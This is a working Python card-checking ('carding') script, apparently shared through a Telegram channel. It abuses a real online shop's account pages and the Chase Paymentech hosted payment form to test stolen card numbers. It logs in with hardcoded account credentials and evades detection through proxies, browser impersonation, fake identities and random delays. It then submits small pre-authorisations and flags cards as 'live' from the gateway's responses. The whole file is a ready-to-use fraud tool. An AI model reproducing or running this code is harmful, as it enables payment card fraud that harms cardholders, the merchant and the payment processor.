import re
import json
import time
import random
import asyncio
import urllib.parse
from urllib.parse import urlparse, parse_qs
from faker import Faker
from curl_cffi.requests import AsyncSession

class tools:
    @staticmethod
    def getcard(card: str, mm_fmt: int = 1, yy_fmt: int = 4) -> dict:
        parts = card.split("|")
        cc = parts[0]
        mm = parts[1].lstrip('0') if mm_fmt == 1 else parts[1]
        if not mm: mm = '0'
        yy = parts[2]
        cvv = parts[3]
        if len(yy) == 2 and yy_fmt == 4:
            yy = "20" + yy
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

    @staticmethod
    def save_response(response: str, filename: str = "response.html") -> bool:
        with open(filename, "w", encoding='utf-8') as file:
            file.write(response)
        print(f"[DEBUG] Saved {filename}")
        return True

    @staticmethod
    def live(response: str) -> bool:
        return any(x in response for x in ["Charged", "DECLINED CVV2", "APPROVED", "Approved", "Transaction Approved"])
    
    @staticmethod
    def _generate_phone() -> str:
        return f"{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    
    @staticmethod
    def userdata() -> dict:
        fake = Faker('en_US')
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "full_name": f"{fn} {ln}",
            "email": f"{fn.lower()}{ln.lower()}{random.randint(100, 999)}@gmail.com",
            "phone": tools._generate_phone()
        }
    
    @staticmethod
    async def get_proxy_ip(session) -> str:
        try:
            response = await session.get('http://httpbin.org/ip', timeout=10)
            return response.json().get('origin', 'Unknown')
        except:
            return "Unknown"

class chk:
    @staticmethod
    async def code(card: str, prox: str = None) -> str:
        card_data = tools.getcard(card, 2, 4)
        retrys = 0
        proxy = prox if prox and prox.startswith(('http://', 'https://')) else (f"http://{prox}" if prox else None)
        base_url = "https://shop.iccsafe.org"
        Result = {"tarjeta": card, "message": "Unknown response", "status": False, "time": 0, "ip": "Unknown", "price": "0.01"}
        time_ini = time.time()

        accounts = [
            {"username": "budxw79435@minitts.net", "password": "_Uk.bF_6w2a.Wq"},
            {"username": "budxw79435@minitts.net", "password": "_Uk.bF_6w2a.Wq"}
        ]

        while retrys < 3:
            for acc in accounts:
                try:
                    async with AsyncSession(impersonate="chrome120", proxy=proxy, verify=False) as session:
                        ip = await tools.get_proxy_ip(session)
                        print(f"[DEBUG] Using proxy IP: {ip}")
                        print(f"[DEBUG] Trying account: {acc['username']}")

                        # ---------- PRE-STEP: Get initial form_key ----------
                        get_headers = {
                            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                        }
                        resp = await session.get(f"{base_url}/customer/account/login/", headers=get_headers)
                        tools.save_response(resp.text, "debug_login_page.html")
                        form_key_init = re.search(r'name="form_key" type="hidden" value="([^"]+)"', resp.text)
                        fkey = form_key_init.group(1) if form_key_init else ""
                        print(f"[DEBUG] Initial form_key: {fkey}")

                        # ---------- STEP 0: Login ----------
                        login_url = f"{base_url}/customer/ajax/login/"
                        login_payload = {
                            "username": acc["username"],
                            "password": acc["password"],
                            "context": "checkout"
                        }
                        if fkey:
                            login_payload["form_key"] = fkey

                        headers = {
                            'Accept': "application/json, text/javascript, */*; q=0.01",
                            'X-Requested-With': "XMLHttpRequest",
                            'Referer': f"{base_url}/customer/account/login/",
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                        }
                        resp = await session.post(login_url, json=login_payload, headers=headers)
                        tools.save_response(resp.text, "debug_login_response.json")
                        print(f"[DEBUG] Login response status: {resp.status_code}")

                        if resp.status_code != 200:
                            # Try form-data fallback
                            login_data = {
                                "login[username]": acc["username"],
                                "login[password]": acc["password"],
                                "form_key": fkey,
                                "context": "checkout"
                            }
                            headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
                            resp = await session.post(login_url, data=login_data, headers=headers)
                            tools.save_response(resp.text, "debug_login_response_form.html")
                            print(f"[DEBUG] Fallback login status: {resp.status_code}")

                        if resp.status_code != 200:
                            print(f"[DEBUG] Login HTTP {resp.status_code}, trying next account...")
                            continue

                        # Verify login success
                        login_success = False
                        try:
                            login_json = resp.json()
                            print(f"[DEBUG] Login JSON: {json.dumps(login_json, indent=2)}")
                            if login_json.get('errors'):
                                print(f"[DEBUG] Login error: {login_json.get('message', 'Unknown')}")
                            elif 'redirectUrl' in login_json:
                                print(f"[DEBUG] Login redirect URL: {login_json['redirectUrl']}")
                                await session.get(login_json['redirectUrl'], headers=get_headers)
                                login_success = True
                            elif 'message' in login_json and 'success' in login_json['message'].lower():
                                login_success = True
                            else:
                                login_success = True
                        except json.JSONDecodeError:
                            if "The account sign-in was incorrect" in resp.text:
                                print("[DEBUG] Login failed: incorrect credentials")
                            else:
                                login_success = True
                                print("[DEBUG] Login response not JSON but HTML, assuming success")

                        if not login_success:
                            print("[DEBUG] Login unsuccessful, trying next account...")
                            continue

                        # ---------- STEP 1: Get addcard page and extract form_key and address_id ----------
                        add_card_url = f"{base_url}/paymentechhpf/paymentoptions/addcard/"
                        headers_html = {
                            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                            'Referer': f"{base_url}/customer/account/",
                            'Upgrade-Insecure-Requests': '1'
                        }
                        resp = await session.get(add_card_url, headers=headers_html)
                        html = resp.text
                        tools.save_response(html, "debug_addcard.html")
                        print(f"[DEBUG] Addcard page URL: {resp.url}")

                        # Extract form_key from hidden input
                        form_key_match = re.search(r'<input name="form_key" type="hidden" value="([^"]+)"', html)
                        if not form_key_match:
                            # Fallback to JSON pattern
                            form_key_match = re.search(r'form_key":"([^"]+)"', html)
                        if not form_key_match:
                            print("[DEBUG] Could not find form_key in addcard page")
                            continue
                        form_key = form_key_match.group(1)
                        print(f"[DEBUG] Extracted form_key: {form_key}")

                        # Extract address_id from selected address radio button
                        address_id_match = re.search(r'<input[^>]+name="address_id"[^>]+value="(\d+)"[^>]*checked', html)
                        if not address_id_match:
                            # Try other patterns
                            address_id_match = re.search(r'name="address_id"[\s\S]*?value="(\d+)"', html)
                        if not address_id_match:
                            address_id_match = re.search(r'data-address-id="(\d+)"', html)
                        if not address_id_match:
                            print("[DEBUG] Could not find address_id in addcard page. Trying to create a new address...")
                            # Address creation code here (same as before)
                            addr_url = f"{base_url}/customer/address/new/"
                            resp_addr = await session.get(addr_url, headers=headers_html)
                            fkey_addr = re.search(r'name="form_key" type="hidden" value="([^"]+)"', resp_addr.text)
                            if fkey_addr:
                                user = tools.userdata()
                                name_parts = user['full_name'].split()
                                fname = name_parts[0]
                                lname = name_parts[1] if len(name_parts) > 1 else "Smith"
                                addr_payload = {
                                    'form_key': fkey_addr.group(1),
                                    'firstname': fname,
                                    'lastname': lname,
                                    'telephone': user['phone'],
                                    'street[]': '123 Main St',
                                    'city': 'New York',
                                    'region_id': '43',
                                    'postcode': '10001',
                                    'country_id': 'US',
                                    'default_billing': '1',
                                    'default_shipping': '1'
                                }
                                await session.post(f"{base_url}/customer/address/formPost/", data=addr_payload, headers=headers_html)
                                # Re-fetch addcard page
                                resp = await session.get(add_card_url, headers=headers_html)
                                html = resp.text
                                address_id_match = re.search(r'<input[^>]+name="address_id"[^>]+value="(\d+)"[^>]*checked', html)
                                if not address_id_match:
                                    address_id_match = re.search(r'name="address_id"[\s\S]*?value="(\d+)"', html)
                        if not address_id_match:
                            print("[DEBUG] Still no address_id found.")
                            continue
                        address_id = address_id_match.group(1)
                        print(f"[DEBUG] Extracted address_id: {address_id}")

                        # ---------- STEP 2: Get Chase UID (cardinformation) with full browser headers ----------
                        # Add a random delay to mimic human behavior
                        await asyncio.sleep(random.uniform(2, 4))

                        cardinfo_url = f"{base_url}/paymentechhpf/paymentoptions/cardinformation/"
                        headers_cardinfo = {
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Cache-Control': 'max-age=0',
                            'Connection': 'keep-alive',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Host': 'shop.iccsafe.org',
                            'Origin': 'https://shop.iccsafe.org',
                            'Referer': add_card_url,  # exact addcard URL
                            'Sec-Fetch-Dest': 'iframe',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': 'same-origin',
                            'Sec-Fetch-User': '?1',
                            'Upgrade-Insecure-Requests': '1',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                        }
                        payload = {
                            'address_id': address_id,
                            'form_key': form_key
                        }
                        resp = await session.post(cardinfo_url, data=payload, headers=headers_cardinfo)
                        tools.save_response(resp.text, "debug_cardinformation.html")
                        print(f"[DEBUG] Cardinformation status: {resp.status_code}")
                        print(f"[DEBUG] Cardinformation final URL: {resp.url}")

                        # Extract uID from iframe src
                        chase_uid = None
                        iframe_match = re.search(r'<iframe[^>]+src=["\']([^"\']+)["\']', resp.text, re.I)
                        if iframe_match:
                            iframe_src = iframe_match.group(1)
                            parsed = urlparse(iframe_src)
                            qs = parse_qs(parsed.query)
                            if 'uID' in qs:
                                chase_uid = qs['uID'][0]
                                print(f"[DEBUG] Extracted uID from iframe src: {chase_uid}")

                        # Fallback: try to find uID in any other pattern
                        if not chase_uid:
                            uid_match = re.search(r'[?&]uID=([A-Fa-f0-9]+)', resp.text, re.I)
                            if uid_match:
                                chase_uid = uid_match.group(1)
                                print(f"[DEBUG] Extracted uID via fallback: {chase_uid}")

                        if not chase_uid:
                            print("[DEBUG] uID not found. Check debug_cardinformation.html")
                            # Print first 500 chars for diagnosis
                            print(resp.text[:500])
                            continue

                        print(f"[DEBUG] Chase UID: {chase_uid}")

                        # ---------- STEP 3: Fetch Iframe Params ----------
                        iframe_url = f"https://www.chasepaymentechhostedpay.com/hpf/1_1/?uID={chase_uid}"
                        resp = await session.get(iframe_url, headers=headers_cardinfo)
                        iframe_params = dict(re.findall(r'name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', resp.text))
                        iframe_params.update(dict(re.findall(r'value=["\']([^"\']*)["\'][^>]*name=["\']([^"\']+)["\']', resp.text)))
                        
                        # ---------- STEP 4: Process Payment ----------
                        process_url = "https://www.chasepaymentechhostedpay.com/hpf/1_1/iframeprocessor.php"
                        user = tools.userdata()
                        card_type = "Visa" if card_data['cc'].startswith('4') else "Mastercard" if card_data['cc'].startswith('5') else "Discover"
                        payload = {
                            **iframe_params,
                            'action': "process",
                            'amount': "0.01",
                            'ccNumber': card_data['cc'],
                            'CVV2': card_data['cvv'],
                            'ccType': card_type,
                            'expMonth': card_data['mm'],
                            'expYear': card_data['yy'],
                            'name': user['full_name']
                        }
                        
                        headers_process = {
                            'Origin': "https://www.chasepaymentechhostedpay.com",
                            'Referer': iframe_url,
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                        }
                        final_resp = await session.post(process_url, data=payload, headers=headers_process)
                        res = final_resp.text
                        tools.save_response(res, "debug_payment_response.json")
                        
                        display_msg = res[:300].replace('\n', ' ')
                        try:
                            res_json = json.loads(res)
                            print(f"[DEBUG] Payment JSON: {json.dumps(res_json, indent=2)}")
                            if 'gatewayMessage' in res_json:
                                display_msg = urllib.parse.unquote_plus(res_json['gatewayMessage'])
                            elif 'message' in res_json:
                                display_msg = res_json['message']
                        except:
                            pass

                        Result.update(message=display_msg, status=tools.live(res), time=round(time.time()-time_ini, 2), ip=ip)
                        return json.dumps(Result)

                except Exception as e:
                    print(f"[ERROR] Attempt with {acc['username']} failed: {e}")
                    import traceback
                    traceback.print_exc()
                    continue
            retrys += 1
        return json.dumps(Result)

if __name__ == "__main__":
    proxy = input("Proxy: ")
    while True:
        card = input("Enter Card: ")
        print(asyncio.run(chk.code(card, proxy)))
        
        
        
## Korol Api Drop [ https://t.me/+mAn7tSSCtNMzNWZl ]
## Date: 20-05-2026
## Api Made By: @Eleosvanberg aka ⏤͟͞𝙀 ♡
## Channel & Bot: @Rna_Updates & @CyraCc_Bot 
## Rest API
## Gate: [ Chase Auth ( preauth)]
## Total Requests: [12]
## Site Type: [clean ]